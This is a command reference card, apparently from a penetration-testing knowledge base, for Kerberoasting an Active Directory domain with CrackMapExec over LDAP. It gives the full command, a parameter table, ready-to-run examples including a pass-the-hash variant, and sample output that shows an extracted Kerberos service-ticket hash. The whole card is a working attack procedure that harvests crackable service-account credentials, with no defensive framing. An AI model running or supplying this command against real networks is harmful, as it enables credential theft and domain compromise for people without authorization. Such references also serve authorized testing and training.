---
type: command
executor: bash
data: >-
  crackmapexec ldap DC_IP -u USER -p PASSWORD --kdcHost DC_IP --kerberoast
  output_hashes.txt
tags:
  - kerberoasting
  - ldap
platforms:
  - Linux
verified: true
validated: true
---

# crackmapexec-ldap-kerberoast

## Command

```bash
crackmapexec ldap DC_IP -u USER -p PASSWORD --kdcHost DC_IP --kerberoast output_hashes.txt
```

## Description

Uses CrackMapExec to authenticate via LDAP, enumerate SPNs, request TGS tickets, and export hashes for Kerberoasting. Efficient for domain-wide scanning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| DC_IP | Domain Controller IP | Yes |
| -u USER | Username | Yes |
| -p PASSWORD | Password (or -H for NTLM) | Yes |
| --kdcHost DC_IP | Kerberos KDC host | Yes |
| --kerberoast output_hashes.txt | Enable roasting and output file | Yes |

## Examples

### Basic Usage

```bash
crackmapexec ldap 10.10.10.10 -u user -p pass --kdcHost 10.10.10.10 --kerberoast hashes.txt
```

### With NTLM Hash

```bash
crackmapexec ldap 10.10.10.10 -u user -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --kdcHost 10.10.10.10 --kerberoast hashes.txt
```

## Expected Output

LDAP 10.10.10.10 389 dc01 [*] Windows Server 2019 ... (domain:lab.local)
LDAP 10.10.10.10 389 dc01 $krb5tgs$23$*svcuser$lab.local$HTTP/webserver.lab.local$*...<hash>

## Related

- [[procedures/Kerberoasting-with-Rubeus]]
- [[tools/CrackMapExec]]
